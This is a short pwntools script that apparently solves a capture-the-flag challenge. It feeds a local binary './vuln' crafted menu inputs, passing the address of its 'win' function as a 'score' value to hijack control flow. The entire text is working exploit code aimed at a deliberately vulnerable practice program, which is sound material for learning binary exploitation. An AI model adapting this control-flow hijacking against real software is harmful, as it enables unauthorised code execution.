from pwn import *

io = process('./vuln')
elf = ELF('./vuln')

def givescore(student, teacher, StudentGiveScore, teacherBeingGivenScore, score):
	print(io.recv())
	io.sendline(student)
	print(io.recv())
	io.sendline(teacher)
	print(io.recv())
	io.sendline(StudentGiveScore)
	print(io.recv())
	io.sendline(teacherBeingGivenScore)
	print(io.recv())
	io.sendline(str(score))

givescore(b'A', b'A', b'A', b'A', elf.sym['win'])
givescore(b'lmao', b'bruh', b'A', b'bruh', 1)
print(io.recv())
